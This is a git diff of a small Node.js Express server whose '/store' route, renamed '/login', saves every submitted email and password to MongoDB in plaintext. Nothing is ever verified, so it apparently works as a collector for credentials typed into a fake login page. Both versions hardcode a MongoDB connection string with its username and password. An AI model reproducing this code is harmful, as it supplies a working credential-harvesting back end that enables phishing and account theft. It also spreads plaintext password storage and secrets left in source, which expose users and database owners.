@@ -1,44 +1,44 @@
-require('dotenv').config();
-const express = require('express');
-const mongoose = require('mongoose');
-const cors = require('cors');
-const bodyParser = require('body-parser');
+const express = require("express");
+const mongoose = require("mongoose");
+const cors = require("cors");
+
 const app = express();
+app.use(express.json());
 app.use(cors());
-app.use(bodyParser.json());
 
-// MongoDB Atlas Connection
-const MONGO_URI = "mongodb+srv://new-user69:Suraj2025@cluster0.1ct8eyx.mongodb.net/users?retryWrites=true&w=majority&appName=Cluster0";
-mongoose.connect(MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
-    .then(() => console.log("✅ MongoDB Connected Successfully!"))
-    .catch(err => console.log("❌ MongoDB Connection Error: ", err));
+// Use your actual MongoDB connection string here
+mongoose.connect("mongodb+srv://new-user69:Suraj2025@cluster0.1ct8eyx.mongodb.net/myDatabase?retryWrites=true&w=majority", {
+    useNewUrlParser: true,
+    useUnifiedTopology: true
+})
+.then(() => console.log("Connected to MongoDB"))
+.catch(err => console.error("MongoDB connection error:", err));
 
-// User Schema
 const UserSchema = new mongoose.Schema({
     email: String,
     password: String
 });
+
 const User = mongoose.model("User", UserSchema);
 
-// Store Credentials in MongoDB
-app.post('/store', async (req, res) => {
-    const { email, password } = req.body;
+// Testing route to check backend
+app.get("/", (req, res) => {
+    console.log("Test route was hit!"); // Console log when the test route is accessed
+    res.json({ message: "Backend is working!" });
+});
 
-    if (!email || !password) {
-        return res.status(400).json({ message: "❌ Email and password are required!" });
-    }
-
+// Post route to store user data
+app.post("/login", async (req, res) => {
     try {
-        // Save credentials to MongoDB
+        const { email, password } = req.body;
         const newUser = new User({ email, password });
         await newUser.save();
-
-        res.json({ success: true, message: "✅ Credentials stored successfully!" });
+        res.json({ message: "Data saved successfully!" });
     } catch (err) {
-        res.status(500).json({ success: false, message: "❌ Error storing credentials" });
+        console.error("Error saving data:", err);
+        res.status(500).json({ message: "Server error!" });
     }
 });
 
-// Start Server
-const PORT = process.env.PORT || 5000;
+const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
